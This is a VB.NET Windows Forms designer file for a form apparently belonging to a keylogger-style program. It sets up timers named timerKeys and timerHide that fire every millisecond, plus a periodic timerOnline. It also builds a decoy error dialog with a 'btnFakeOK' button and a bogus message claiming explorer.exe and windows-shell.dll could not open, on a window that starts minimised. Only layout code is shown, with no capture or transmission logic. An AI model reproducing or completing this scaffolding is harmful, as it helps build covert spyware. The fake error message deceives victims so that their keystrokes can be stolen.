<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class frmMain
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.timerKeys = New System.Windows.Forms.Timer(Me.components)
        Me.timerHide = New System.Windows.Forms.Timer(Me.components)
        Me.timerOnline = New System.Windows.Forms.Timer(Me.components)
        Me.btnFakeOK = New System.Windows.Forms.Button()
        Me.lblERROR = New System.Windows.Forms.Label()
        Me.SuspendLayout()
        '
        'timerKeys
        '
        Me.timerKeys.Enabled = True
        Me.timerKeys.Interval = 1
        '
        'timerHide
        '
        Me.timerHide.Enabled = True
        Me.timerHide.Interval = 1
        '
        'timerOnline
        '
        Me.timerOnline.Enabled = True
        Me.timerOnline.Interval = 10000
        '
        'btnFakeOK
        '
        Me.btnFakeOK.Location = New System.Drawing.Point(102, 36)
        Me.btnFakeOK.Name = "btnFakeOK"
        Me.btnFakeOK.Size = New System.Drawing.Size(75, 23)
        Me.btnFakeOK.TabIndex = 0
        Me.btnFakeOK.Text = "OK"
        Me.btnFakeOK.UseVisualStyleBackColor = True
        '
        'lblERROR
        '
        Me.lblERROR.AutoSize = True
        Me.lblERROR.Location = New System.Drawing.Point(12, 12)
        Me.lblERROR.Name = "lblERROR"
        Me.lblERROR.Size = New System.Drawing.Size(274, 13)
        Me.lblERROR.TabIndex = 1
        Me.lblERROR.Text = "ERROR : Could not open explorer.exe, windows-shell.dll "
        '
        'frmMain
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(289, 68)
        Me.Controls.Add(Me.lblERROR)
        Me.Controls.Add(Me.btnFakeOK)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "frmMain"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "ERROR 00x2B1B17"
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents timerKeys As System.Windows.Forms.Timer
    Friend WithEvents timerHide As System.Windows.Forms.Timer
    Friend WithEvents timerOnline As System.Windows.Forms.Timer
    Friend WithEvents btnFakeOK As System.Windows.Forms.Button
    Friend WithEvents lblERROR As System.Windows.Forms.Label

End Class
